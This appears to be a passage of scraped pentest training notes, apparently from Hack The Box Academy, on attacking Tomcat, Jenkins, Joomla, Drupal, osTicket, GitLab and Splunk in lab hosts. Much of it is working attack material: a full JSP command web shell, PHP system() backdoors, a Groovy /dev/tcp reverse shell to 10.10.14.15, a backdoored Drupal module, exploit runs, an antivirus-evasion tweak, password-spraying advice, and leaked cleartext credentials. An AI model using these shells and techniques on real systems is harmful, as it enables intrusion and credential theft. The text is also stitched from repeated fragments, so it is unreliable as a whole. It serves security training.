Some testers may run a few scans and become discouraged when they don't see anything directly exploitable. If we can dig through our scan data and filter out all of the noise, we will often find things that scanners miss, such as a Tomcat instance with weak or default credentials or a wide-open Git repository that gives us an SSH key or password that we can use elsewhere to gain access. Having a deep understanding of the necessary methodology and mindset will make you successful, no matter if the target network has WordPress and Tomcat or a custom support ticketing system and a network monitoring system such as Nagios. Honorable Mentions \u00b6 Application Abuse Info Axis2 This can be abused similar to Tomcat. We will often actually see it sitting on top of a Tomcat installation. If we cannot get RCE via Tomcat, it is worth checking for weak/default admin credentials on Axis2. We can then upload a webshell in the form of an AAR file (Axis2 service file). There is also a Metasploit module that can assist with this. Websphere Websphere has suffered from many different vulnerabilities over the years. Furthermore, if we can log in to the administrative console with default credentials such as system:manager we can deploy a WAR file (similar to Tomcat) and gain RCE via a web shell or reverse shell. Elasticsearch Elasticsearch has had its fair share of vulnerabilities as well. Though old, we have seen this before on forgotten Elasticsearch installs during an assessment for a large enterprise (and identified within 100s of pages of EyeWitness report output). Though not realistic, the Hack The Box machine Haystack features Elasticsearch. Zabbix Zabbix is an open-source system and network monitoring solution that has had quite a few vulnerabilities discovered such as SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and remote code execution. Zabbix also has built-in functionality that can be abused to gain remote code execution. The HTB box Zipper showcases how to use the Zabbix API to gain RCE. Nagios Nagios is another system and network monitoring product. Nagios has had a wide variety of issues over the years, including remote code execution, root privilege escalation, SQL injection, code injection, and stored XSS. If you come across a Nagios instance, it is worth checking for the default credentials nagiosadmin:PASSW0RD and fingerprinting the version. WebLogic WebLogic is a Java EE application server. At the time of writing, it has 190 reported CVEs . There are many unauthenticated RCE exploits from 2007 up to 2021, many of which are Java Deserialization vulnerabilities. Wikis/Intranets We may come across internal Wikis (such as MediaWiki), custom intranet pages, SharePoint, etc. These are worth assessing for known vulnerabilities but also searching if there is a document repository. We have run into many intranet pages (both custom and SharePoint) that had a search functionality which led to discovering valid credentials. DotNetNuke DotNetNuke (DNN) is an open-source CMS written in C# that uses the .NET framework. It has had a few severe issues over time, such as authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download. vCenter vCenter is often present in large organizations to manage multiple instances of ESXi. It is worth checking for weak credentials and vulnerabilities such as this Apache Struts 2 RCE that scanners like Nessus do not pick up. This unauthenticated OVA file upload vulnerability was disclosed in early 2021, and a PoC for CVE-2021-22005 was released during the development of this module. vCenter comes as both a Windows and a Linux appliance. If we get a shell on the Windows appliance, privilege escalation is relatively simple using JuicyPotato or similar. We have also seen vCenter already running as SYSTEM and even running as a domain admin! It can be a great foothold in the environment or be a single source of compromise. Appilcation Hardening \u00b6 The first step for any organization should be to create a detailed (and accurate) application inventory of both internal and external-facing applications. This can be achieved in many ways, and blue teams on a budget could benefit from pentesting tools such as Nmap and EyeWitness to assist in the process. Various open-source and paid tools can be used to create and maintain this inventory. Without knowing what exists in the environment, we won't know what to protect! Creating this inventory may expose instances of \"shadow IT\" (or unauthorized installs), deprecated applications that are no longer needed, or even issues such as a trial version of a tool being converted to a free version automatically (such as Splunk when it no longer requires authentication). General Hardening Tips \u00b6 Secure authentication : Applications should enforce strong passwords during registration and setup, and default administrative account passwords should be changed. If possible, the default administrative accounts should be disabled, with new custom administrative accounts created. Some applications inherently support 2FA authentication, which should be made mandatory for at least administrator-level users. Access controls : Proper access control mechanisms should be implemented per application. For example, login pages should not be accessible from the external network unless there is a valid business reason for this access. Similarly, file and folder permissions can be configured to deny uploads or application deployments. Disable unsafe features : Features such as PHP code editing in WordPress can be disabled to prevent code execution if the server is compromised. Regular updates : Applications should be updated regularly, and patches supplied by vendors should be applied as soon as possible. Backups : System administrators should always configure website and database backups, allowing the application to be quickly restored in case of a compromise. Security monitoring : There are various tools and plugins that can be used to monitor the status and various security-related issues for our applications. Another option is a Web Application Firewall (WAF). While not a silver bullet, a WAF can help add an extra layer of protection provided all the measures above have already been taken. LDAP integration with Active Directory : Integrating applications with Active Directory single sign-on can increase ease of access, provide more auditing functionality (especially if synced with Azure), and make managing credentials and service accounts more streamlined. It also decreases the number of accounts and passwords that a user will have to remember and give fine-grained control over the password policy. We should be careful with what we expose to the internet. Does that GitLab repo really need to be public? Does our ticketing system need to be accessible outside the internal network? With these controls in place, we will have a solid baseline to apply to all applications regardless of their function.

Any vulnerability in these files can lead to total compromise of the website. example web.xml file. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE web-app PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\" \"http://java.sun.com/dtd/web-app_2_3.dtd\"> <web-app> <servlet> <servlet-name>AdminServlet</servlet-name> <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class> </servlet> <servlet-mapping> <servlet-name>AdminServlet</servlet-name> <url-pattern>/admin</url-pattern> </servlet-mapping> </web-app> web.xml configuration above defines a new servlet named AdminServlet that is mapped to the class com.inlanefreight.api.AdminServlet . Next, a new servlet mapping is created to map requests to /admin with AdminServlet . This configuration will send any request received for /admin to the AdminServlet.class class for processing. The web.xml descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (LFI) vulnerability.

Many exist to make our work more efficient, especially since most penetration tests are \"time-boxed\" or under strict time constraints. No one tool is better than another, and it does not make us a \"bad\" penetration tester if we use certain tools like Metasploit to our advantage. Provided we understand each scanner and exploit script that we run and the risks, then utilizing this scanner properly is no different from using Burp Intruder or writing a custom Python script. Some say, \"work smarter, not harder.\" Why would we make extra work for ourselves during a 40-hour assessment with 1,500 in-scope hosts when we can use a particular tool to help us? It is vital for us to understand how our tools work and how to do many things manually. At the very least, if we decide to use a certain tool, we should be able to explain its usage and potential impact to our clients should they question us during or after the assessment.

This interface is available at /manager/html by default, which only users assigned the manager-gui role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage. The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as this can be downloaded and placed within the archive. <% @ page import = \"java.util.*,java.io.*\" %> <% // // JSP_KIT // // cmd.jsp = Command Execution (unix) // // by: Unknown // modified: 27/06/2003 // %> < HTML >< BODY > < FORM METHOD = \"GET\" NAME = \"myform\" ACTION = \"\" > < INPUT TYPE = \"text\" NAME = \"cmd\" > < INPUT TYPE = \"submit\" VALUE = \"Send\" > </ FORM > < pre > <% if ( request . getParameter ( \"cmd\" ) != null ) { out . println ( \"Command: \" + request . getParameter ( \"cmd\" ) + \"<BR>\" ); Process p = Runtime . getRuntime (). exec ( request . getParameter ( \"cmd\" )); OutputStream os = p . getOutputStream (); InputStream in = p . getInputStream (); DataInputStream dis = new DataInputStream ( in ); String disr = dis . readLine (); while ( disr != null ) { out . println ( disr ); disr = dis . readLine (); } } %> </ pre > </ BODY ></ HTML > hrmns@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp hrmns@htb[/htb]$ zip -r backup.war cmd.jsp adding: cmd.jsp (deflated 81%) Click on Browse to select the .war file and then click on Deploy .

If we do an ls on that directory from our web shell, we'll see the uploaded backup.war file and the backup directory containing the cmd.jsp script and META-INF created after the application deploys. Clicking on Undeploy will typically remove the uploaded WAR archive and the directory associated with the application. Could also use msfvenom to generate a malicious WAR file.

This JSP web shell is very lightweight (under 1kb) and utilizes a Bookmarklet or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded cmd.jsp would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit). The web shell as is only gets detected by 2/58 anti-virus vendors. A simple change such as changing: FileOutputStream ( f ); stream . write ( m ); o = \"Uploaded: to FileOutputStream ( f ); stream . write ( m ); o = \"uPlOaDeD: results in 0/58 security vendors flagging the cmd.jsp file as malicious at the time of writing. Quick Note on Web shells When we upload web shells (especially on externals), we want to prevent unauthorized access. We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don't want an attacker to come across our web shell and leverage it to gain their own foothold. CVE-2020-1938 : Ghostcat \u00b6 Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named Ghostcat . All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable. This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat. AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers. AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan. hrmns@htb[/htb]$ nmap -sV -p 8009 ,8080 app-dev.inlanefreight.local Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT Nmap scan report for app-dev.inlanefreight.local (10.129.201.58) Host is up (0.14s latency).

Jenkins \u00b6 Jenkins is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. Discovery/Footprinting \u00b6 It is often installed on Windows servers running as the all-powerful SYSTEM account. If we can gain access via Jenkins and gain remote code execution as the SYSTEM account, we would have a foothold in Active Directory to begin enumeration of the domain environment. Jenkins runs on Tomcat port 8080 by default. Utilizes port 5000 to attach slave servers. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts. Enumeration \u00b6 Default installation typically uses Jenkins\u2019 database to store credentials and does not allow users to register an account. We can fingerprint Jenkins quickly by the telltale login page. May encounter a Jenkins instance that uses weak or default credentials such as admin:admin or does not have any type of authentication enabled. It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test. Attacking Jenkins \u00b6 Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the Script Console . Allows to run arbitrary Groovy scripts within the Jenkins controller runtime. Can be abused to run operating system commands on the underlying server. Script Console \u00b6 Script console can be reached at the URL http://jenkins.inlanefreight.local:8000/script def cmd = 'id' def sout = new StringBuffer (), serr = new StringBuffer () def proc = cmd . execute () proc . consumeProcessOutput ( sout , serr ) proc . waitForOrKill ( 1000 ) println sout There are various ways that access to the script console can be leveraged to gain a reverse shell. For example, using the command below, or this Metasploit module. r = Runtime . getRuntime () p = r . exec ([ \"/bin/bash\" , \"-c\" , \"exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \\$line 2>&5 >&5; done\" ] as String []) p . waitFor () Running above cmds results in a revshell hrmns@htb[/htb]$ nc -lvnp 8443 listening on [any] 8443 ... connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844 id uid=0(root) gid=0(root) groups=0(root) /bin/bash -i root@app02:/var/lib/jenkins3# Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with Invoke-PowerShellTcp.ps1 . We could run commands on a Windows-based Jenkins install using this snippet: def cmd = \"cmd.exe /c dir\".execute(); println(\"${cmd.text}\"); We could also use this Java reverse shell to gain command execution on a Windows host, swapping out localhost and the port for our IP address and listener port.

This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the WEB-INF/classes folder. These classes might contain important business logic as well as sensitive information.

Many exist to make our work more efficient, especially since most penetration tests are \"time-boxed\" or under strict time constraints. No one tool is better than another, and it does not make us a \"bad\" penetration tester if we use certain tools like Metasploit to our advantage. Provided we understand each scanner and exploit script that we run and the risks, then utilizing this scanner properly is no different from using Burp Intruder or writing a custom Python script. Some say, \"work smarter, not harder.\" Why would we make extra work for ourselves during a 40-hour assessment with 1,500 in-scope hosts when we can use a particular tool to help us? It is vital for us to understand how our tools work and how to do many things manually. At the very least, if we decide to use a certain tool, we should be able to explain its usage and potential impact to our clients should they question us during or after the assessment. Let's say a particular Metasploit module (or another tool) is failing or not behaving the way we believe it should. We can always use Burp Suite or ZAP to proxy the traffic and troubleshoot. To do this, first, fire up Burp Suite and then set the PROXIES option like the following: msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080 PROXIES => HTTP:127.0.0.1:8080 msf6 auxiliary(scanner/http/tomcat_mgr_login) > run [!] No active DB -- Credential data will not be saved!

This JSP web shell is very lightweight (under 1kb) and utilizes a Bookmarklet or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded cmd.jsp would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit). The web shell as is only gets detected by 2/58 anti-virus vendors. A simple change such as changing: FileOutputStream ( f ); stream . write ( m ); o = \"Uploaded: to FileOutputStream ( f ); stream . write ( m ); o = \"uPlOaDeD: results in 0/58 security vendors flagging the cmd.jsp file as malicious at the time of writing. Quick Note on Web shells When we upload web shells (especially on externals), we want to prevent unauthorized access. We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don't want an attacker to come across our web shell and leverage it to gain their own foothold.","title":"Tomcat Manager - WAR File Upload"},{"location":"attacking_common_apps/containers_software_dev/#cve-2020-1938-ghostcat","text":"Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named Ghostcat .

Default administrator account on Joomla installs is admin, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use this script to attempt to brute force the login. hrmns@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin admin:admin Attacking Joomla \u00b6 Using the credentials that we obtained in the examples from the last section, let's log in to the target backend at http://dev.inlanefreight.local/administrator . Once logged in, we can see many options available to us. For our purposes, we would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template. From here, click on Templates on the bottom left under Configuration to pull up the templates menu. Next, we can click on a template name. Let's choose protostar under the Template column header. This will bring us to the Templates: Customise page. Click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a \"drive-by\" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client. Let's choose the error.php page. We'll add a PHP one-liner to gain code execution as follows. system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); Click on Save & Close at the top and confirm code execution using cURL . hrmns@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php/error.php?dcfdd5e021a869fcc6dfaef8bf31377e = id uid=33(www-data) gid=33(www-data) groups=33(www-data) From here, we can upgrade to an interactive reverse shell and begin looking for local privilege escalation vectors or focus on lateral movement within the corporate network. Note down this change for our report appendices and make every effort to remove the PHP snippet from the error.php page. Leveraging Known Vulnerabilities \u00b6 Researching a bit, we find that this version of Joomla is likely vulnerable to CVE-2019-10945 which is a directory traversal and authenticated file deletion vulnerability. We can use this exploit script to leverage the vulnerability and list the contents of the webroot and other directories. As pentesters, this would only be useful to us if the admin login portal is not accessible from the outside since, armed with admin creds, we can gain remote code execution, as we saw above. hrmns@htb[/htb]$ python2.7 joomla_dir_trav.py --url \"http://dev.inlanefreight.local/administrator/\" --username admin --password admin --dir / # Exploit Title: Joomla Core ( 1 .5.0 through 3 .9.4 ) - Directory Traversal && Authenticated Arbitrary File Deletion # Web Site: Haboob.sa # Email: research@haboob.sa # Versions: Joomla 1 .5.0 through Joomla 3 .9.4 # https://cve.mitre.org/cgi-bin/cvename.cgi?name = CVE-2019-10945 _ _ ____ ____ ____ ____ | | | | /\\ | _ \\ / __ \\ / __ \\| _ \\ | |__| | / \\ | |_) | | | | | | | |_) | | __ | / /\\ \\ | _ <| | | | | | | _ < | | | |/ ____ \\| |_) | |__| | |__| | |_) | |_| |_/_/ \\_\\____/ \\____/ \\____/|____/ administrator bin cache cli components images includes language layouts libraries media modules plugins templates tmp LICENSE.txt README.txt configuration.php htaccess.txt index.php robots.txt web.config.txt Drupal - Discovery & Enumeration \u00b6 Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend. A Drupal website can be identified in several ways, including by the header or footer message Powered by Drupal , the standard Drupal logo, the presence of a CHANGELOG.txt file or README.txt file, via the page source, or clues in the robots.txt file such as references to /node . hrmns@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal <meta name=\"Generator\" content=\"Drupal 8 (https://www.drupal.org)\" /> <span>Powered by <a href=\"https://www.drupal.org\">Drupal</a></span> Another way to identify Drupal CMS is through nodes . Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form /node/<nodeid> . Enumeration \u00b6 Newer installs of Drupal by default block access to the** CHANGELOG.txt** and README.txt files, so we may need to do further enumeration. Enumerate the version number using the CHANGELOG.txt file. Use cURL along with grep, sed, head, etc. hrmns@htb[/htb]$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 \"\" Drupal 7.57, 2018-02-21 Identified an older version of Drupal in use.

A quick search for Drupal-related vulnerabilities does not show anything apparent for this core version of Drupal. We would next want to look at installed plugins or abusing built-in functionality. Attacking Drupal \u00b6 Unlike some CMS', obtaining a shell on a Drupal host via the admin console is not as easy as just editing a PHP file found within a theme or uploading a malicious PHP script. Leveraging the PHP Filter Module \u00b6 In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which \"Allows embedded PHP code/snippets to be evaluated.\" Tick the check box next to the module and scroll down to Save configuration . Next, we could go to Content \u2192 Add content and create a Basic page . We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common cmd to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard system($_GET['cmd']); we open up ourselves up to a \"drive-by\" attacker potentially coming across our web shell. Though unlikely, better safe than sorry! <?php system ( $_GET [ 'dcfdd5e021a869fcc6dfaef8bf31377e' ]); ?> Make sure to set Text format drop-down to PHP code . After clicking save, we will be redirected to the new page, in this example http://drupal-qa.inlanefreight.local/node/3 . Once saved, we can either request execute commands in the browser by appending ?dcfdd5e021a869fcc6dfaef8bf31377e=id to the end of the URL to run the id command or use cURL on the command line. From here, we could use a bash one-liner to obtain reverse shell access. hrmns@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e = id | grep uid | cut -f4 -d \">\" uid=33(www-data) gid=33(www-data) groups=33(www-data) From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first. hrmns@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz Once downloaded go to Administration > Reports > Available updates . Location may differ based on the Drupal version and may be under the Extend menu. Click on Browse , select the file from the directory we downloaded it to, and then click Install . Once installed, click on Content and create a new basic page. be sure to select PHP code from the Text format dropdown. Uploading a Backdoored Module \u00b6 Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as CAPTCHA . Scroll down and copy the link for the tar.gz archive . hrmns@htb[/htb]$ wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz hrmns@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz Create PHP web shell <?php system ( $_GET [ fe8edbabc5c5c9b7b764504cd22b17af ]); ?> We need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder. < IfModule mod_rewrite . c > RewriteEngine On RewriteBase / </ IfModule > The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive. hrmns@htb[/htb]$ mv shell.php .htaccess captcha hrmns@htb[/htb]$ tar cvf captcha.tar.gz captcha/ captcha/ captcha/.travis.yml captcha/README.md captcha/captcha.api.php captcha/captcha.inc captcha/captcha.info.yml captcha/captcha.install <SNIP> Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install . Once the installation succeeds, browse to /modules/captcha/shell.php to execute commands. hrmns@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af = id uid=33(www-data) gid=33(www-data) groups=33(www-data) Drupalgeddon \u00b6 This flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this PoC script. Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution. hrmns@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd <SNIP> [!] VULNERABLE!

It can be compared to systems such as Jira, OTRS, Request Tracker, and Spiceworks. Footprinting/Discovery/Enumeration \u00b6 Looking back at our EyeWitness scan from earlier, we notice a screenshot of an osTicket instance which also shows that a cookie named OSTSESSID was set when visiting the page. osTicket is a web application that is highly maintained and serviced. If we look at the CVEs found over decades, we will not find many vulnerabilities and exploits that osTicket could have. This is an excellent example to show how important it is to understand how a web application works. User Input The core function of osTicket is to inform the company's employees about a problem so that a problem can be solved with the service or other components. A significant advantage we have here is that the application is open-source. Therefore, we have many tutorials and examples available to take a closer look at the application. For instance, from the osTicket documentation , we can see that only staff and users with administrator privileges can access the admin panel. So if our target company uses this or a similar application, we can cause a problem and \"play dumb\" and contact the company's staff. The simulated \"lack of\" knowledge about the services offered by the company in combination with a technical problem is a widespread social engineering approach to get more information from the company. Processing As staff or administrators, they try to reproduce significant errors to find the core of the problem. Processing is finally done internally in an isolated environment that will have very similar settings to the systems in production. Suppose staff and administrators suspect that there is an internal bug that may be affecting the business. In that case, they will go into more detail to uncover possible code errors and address more significant issues. Solution Depending on the depth of the problem, it is very likely that other staff members from the technical departments will be involved in the email correspondence. This will give us new email addresses to use against the osTicket admin panel (in the worst case) and potential usernames with which we can perform OSINT on or try to apply to other company services. Attacking osTicket \u00b6 Suppose we find an exposed service such as a company's Slack server or GitLab, which requires a valid company email address to join. Many companies have a support email such as support@inlanefreight.local , and emails sent to this are available in online support portals that may range from Zendesk to an internal custom tool. Furthermore, a support portal may assign a temporary internal email address to a new ticket so users can quickly check its status. If we come across a customer support portal during our assessment and can submit a new ticket, we may be able to obtain a valid company email address. http://support.inlanefreight.local/open.php This is a modified version of osTicket as an example, but we can see that an email address was provided. http://support.inlanefreight.local/open.php If we log in, we can see information about the ticket and ways to post a reply. If the company set up their helpdesk software to correlate ticket numbers with emails, then any email sent to the email we received when registering, 940288@inlanefreight.local , would show up here. With this setup, if we can find an external portal such as a Wiki, chat service (Slack, Mattermost, Rocket.chat), or a Git repository such as GitLab or Bitbucket, we may be able to use this email to register an account and the help desk support portal to receive a sign-up confirmation email. http://support.inlanefreight.local/open.php osTicket - Sensitive Data Exposure \u00b6 Let's say we are on an external penetration test. During our OSINT and information gathering, we discover several user credentials using the tool Dehashed . hrmns@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p id : 5996447501 email : julie.clayton@inlanefreight.local username : jclayton password : JulieC8765! hashed_password : name : Julie Clayton vin : address : phone : database_name : ModBSolutions id : 7344467234 email : kevin@inlanefreight.local username : kgrimes password : Fish1ng_s3ason! hashed_password : name : Kevin Grimes vin : address : phone : database_name : MyFitnessPal <SNIP> This dump shows cleartext passwords for two different users: jclayton and kgrimes . At this point, we have also performed subdomain enumeration and come across several interesting ones. hrmns@htb[/htb]$ cat ilfreight_subdomains vpn.inlanefreight.local support.inlanefreight.local ns1.inlanefreight.local mail.inlanefreight.local apps.inlanefreight.local ftp.inlanefreight.local dev.inlanefreight.local ir.inlanefreight.local auth.inlanefreight.local careers.inlanefreight.local portal-stage.inlanefreight.local dns1.inlanefreight.local dns2.inlanefreight.local meet.inlanefreight.local portal-test.inlanefreight.local home.inlanefreight.local legacy.inlanefreight.local We browse to each subdomain and find that many are defunct, but the support.inlanefreight.local and vpn.inlanefreight.local are active and very promising. Support.inlanefreight.local is hosting an osTicket instance, and vpn.inlanefreight.local is a Barracuda SSL VPN web portal that does not appear to be using multi-factor authentication. http://support.inlanefreight.local/scp/login.php We then try the credentials for kgrimes and have no success but noticing that the login page also accepts an email address, we try kevin@inlanefreight.local and get a successful login! http://support.inlanefreight.local/scp/login.php The user kevin appears to be a support agent but does not have any open tickets. Perhaps they are no longer active? In a busy enterprise, we would expect to see some open tickets. Digging around a bit, we find one closed ticket, a conversation between a remote employee and the support agent. http://support.inlanefreight.local/scp/login.php The employee states that they were locked out of their VPN account and asks the agent to reset it. The agent then tells the user that the password was reset to the standard new joiner password. The user does not have this password and asks the agent to call them to provide them with the password. The agent then commits an error and sends the password to the user directly via the portal. From here, we could try this password against the exposed VPN portal as the user may not have changed it. The support agent states that this is the standard password given to new joiners and sets the user's password to this value. We have been in many organizations where the helpdesk uses a standard password for new users and password resets. Often the domain password policy is lax and does not force the user to change at the next login. If this is the case, it may work for other users. In this scenario, it would be worth using tools like linkedin2username to create a user list of company employees and attempt a password spraying attack against the VPN endpoint with this standard password. Many applications such as osTicket also contain an address book. It would also be worth exporting all emails/usernames from the address book as part of our enumeration as they could also prove helpful in an attack such as password spraying. Gitlab \u00b6 GitLab is a web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality. It is open-source and originally written in Ruby, but the current technology stack includes Go, Ruby on Rails, and Vue.js. During internal and external penetration tests, it is common to come across interesting data in a company's GitHub repo or a self-hosted GitLab or BitBucket instance. We may find scripts or configuration files that were accidentally committed containing cleartext secrets such as passwords that we may use to our advantage. May also come across SSH private keys. Can attempt to use the search function to search for users, passwords, etc. Worth perusing any public repositories for sensitive data and, if the application allows, register an account and look to see if any interesting internal repositories are accessible. If we can obtain user credentials from our OSINT, we may be able to log in to a GitLab instance. Two-factor authentication is disabled by default. ![https://academy.hackthebox.com/storage/modules/113/gitlab_2fa.png] Footprinting/Discovery \u00b6 We can quickly determine that GitLab is in use in an environment by just browsing to the GitLab URL, and we will be directed to the login page, which displays the GitLab logo. http://gitlab.inlanefreight.local:8081/users/sign_in Version Number -> browse to /help when logged in. If we cannot register an account, we may have to try a low-risk exploit such as this . We do not recommend launching various exploits at an application, so if we have no way to enumerate the version number (such as a date on the page, the first public commit, or by registering a user), then we should stick to hunting for secrets and not try multiple exploits against it blindly. There have been a few serious exploits against GitLab 12.9.0 and GitLab 11.4.7 in the past few years as well as GitLab Community Edition 13.10.3 , 13.9.3 , and 13.10.2 . Enumeration \u00b6 There's not much we can do against GitLab without knowing the version number or being logged in. The first thing we should try is browsing to /explore and see if there are any public projects that may contain something interesting. Browsing to this page, we see a project called Inlanefreight dev .

If we look at the CVEs found over decades, we will not find many vulnerabilities and exploits that osTicket could have. This is an excellent example to show how important it is to understand how a web application works. User Input The core function of osTicket is to inform the company's employees about a problem so that a problem can be solved with the service or other components. A significant advantage we have here is that the application is open-source. Therefore, we have many tutorials and examples available to take a closer look at the application. For instance, from the osTicket documentation , we can see that only staff and users with administrator privileges can access the admin panel. So if our target company uses this or a similar application, we can cause a problem and \"play dumb\" and contact the company's staff. The simulated \"lack of\" knowledge about the services offered by the company in combination with a technical problem is a widespread social engineering approach to get more information from the company. Processing As staff or administrators, they try to reproduce significant errors to find the core of the problem. Processing is finally done internally in an isolated environment that will have very similar settings to the systems in production. Suppose staff and administrators suspect that there is an internal bug that may be affecting the business. In that case, they will go into more detail to uncover possible code errors and address more significant issues. Solution Depending on the depth of the problem, it is very likely that other staff members from the technical departments will be involved in the email correspondence. This will give us new email addresses to use against the osTicket admin panel (in the worst case) and potential usernames with which we can perform OSINT on or try to apply to other company services.","title":"Footprinting/Discovery/Enumeration"},{"location":"attacking_common_apps/cs_config_mgmt/#attacking-osticket","text":"Suppose we find an exposed service such as a company's Slack server or GitLab, which requires a valid company email address to join.

Perhaps they are no longer active? In a busy enterprise, we would expect to see some open tickets. Digging around a bit, we find one closed ticket, a conversation between a remote employee and the support agent. http://support.inlanefreight.local/scp/login.php The employee states that they were locked out of their VPN account and asks the agent to reset it. The agent then tells the user that the password was reset to the standard new joiner password. The user does not have this password and asks the agent to call them to provide them with the password. The agent then commits an error and sends the password to the user directly via the portal. From here, we could try this password against the exposed VPN portal as the user may not have changed it. The support agent states that this is the standard password given to new joiners and sets the user's password to this value. We have been in many organizations where the helpdesk uses a standard password for new users and password resets. Often the domain password policy is lax and does not force the user to change at the next login. If this is the case, it may work for other users. In this scenario, it would be worth using tools like linkedin2username to create a user list of company employees and attempt a password spraying attack against the VPN endpoint with this standard password. Many applications such as osTicket also contain an address book.

Once logged in, we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications. Common method of gaining remote code execution on a Splunk server is through the use of a scripted input. These are designed to help integrate Splunk with data sources such as APIs or file servers that require custom methods to access. Scripted inputs are intended to run these scripts, with STDOUT provided as input to Splunk. As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script. Attacking Splunk \u00b6 We can gain remote code execution on Splunk by creating a custom application to run Python, Batch, Bash, or PowerShell scripts.

